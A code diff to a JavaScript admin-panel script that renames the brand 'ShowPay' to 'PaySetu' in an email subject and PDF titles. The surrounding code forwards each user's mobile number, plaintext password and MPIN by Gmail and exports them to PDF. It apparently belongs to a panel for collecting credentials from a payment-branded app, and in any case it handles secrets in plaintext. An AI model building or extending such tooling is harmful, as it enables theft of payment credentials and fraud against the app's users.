@@ -135,7 +135,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   document.getElementById("gmailForwardBtn").addEventListener("click", () => {
     if (!currentUser) return;
-    const subject = encodeURIComponent("ShowPay User Details");
+    const subject = encodeURIComponent("PaySetu User Details");
     const body = encodeURIComponent(
       `Mobile Number: ${currentUser.mobile}\nPassword: ${currentUser.password}\nMPIN: ${currentUser.mpin || "Not Set"}\nStatus: ${currentUser.status}\nLogin Count: ${currentUser.login_count || 0}\nDate: ${currentUser.created_at ? new Date(currentUser.created_at).toLocaleString() : "N/A"}\nLast Login: ${currentUser.last_login ? new Date(currentUser.last_login).toLocaleString() : "N/A"}`,
     );
@@ -150,7 +150,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const { jsPDF } = window.jspdf;
     const doc = new jsPDF();
     doc.setFontSize(16);
-    doc.text("ShowPay User Details", 10, 20);
+    doc.text("PaySetu User Details", 10, 20);
     doc.setFontSize(12);
     doc.text(`Mobile: ${currentUser.mobile}`, 10, 30);
     doc.text(`Password: ${currentUser.password}`, 10, 40);
@@ -302,7 +302,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const { jsPDF } = window.jspdf;
       const doc = new jsPDF();
       doc.setFontSize(16);
-      doc.text("ShowPay Selected Users", 10, 20);
+      doc.text("PaySetu Selected Users", 10, 20);
       doc.setFontSize(10);
       doc.text(`Generated: ${new Date().toLocaleString()}`, 10, 28);
       
@@ -354,3 +354,4 @@ document.addEventListener("DOMContentLoaded", () => {
 
   fetchUsers();
 });
+
